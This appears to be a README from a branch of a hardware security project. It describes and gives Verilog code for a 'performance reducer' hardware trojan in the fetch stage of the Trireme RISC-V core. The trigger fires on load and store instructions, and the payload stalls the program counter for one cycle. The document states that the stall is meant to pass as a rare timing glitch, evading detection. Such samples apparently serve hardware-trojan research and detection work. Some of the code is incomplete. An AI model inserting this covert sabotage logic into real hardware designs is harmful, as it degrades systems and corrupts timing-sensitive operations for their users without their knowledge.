# Performance Reducer
This branch houses a basic counter based performance reduced trojan on the Fetch module within Trireme.

## Trigger

When any read/write instruction is fetched and the trigger isn't already active, the Trojan is trigged.

```verilog
reg trigger;
wire [6:0] opcode;
wire is_read;
wire is_write;

assign opcode = i_mem_data[6:0];

assign is_read = (opcode == 7'b0000011); // Load instructions (e.g., LB, LH, LW)
assign is_write = (opcode == 7'b0100011); // Store instructions (e.g., SB, SH, SW)

localparam NOP = 32'h00000013;

assign triggerOn = (triggerOff) ? 1'b0 : (is_read || is_write);

assign instruction = flush ? NOP : i_mem_data;
```

## Payload

The payload is embedded within the fetch issue module as a branch to the same instruction, which is injected into the output stream of the module as well as a signal to avoid infinite loops.

The payload creates a transient fault – a single-cycle execution stall – rather than a permanent hang. This subtle disruption can reduce perfomance and corrupt time-sensitive operations (e.g., cryptographic routines, sensor polling) while evading detection by appearing as a rare timing glitch.

```verilog
always @(posedge clock)begin
  if(reset)begin
    PC_reg      <= RESET_PC;
  end
  else begin
    triggerOff = (triggerOn) ? 1'b1 : 1'b0;
    case(next_PC_select)
      2'b00  : PC_reg <= (triggerOn) ? PC_reg : PC_reg + 4 ;
      2'b01  : PC_reg <= PC_reg;
      2'b10  : PC_reg <= target_PC;
      default: PC_reg <= {ADDRESS_BITS{1'b0}};
    endcase
  end
end
```
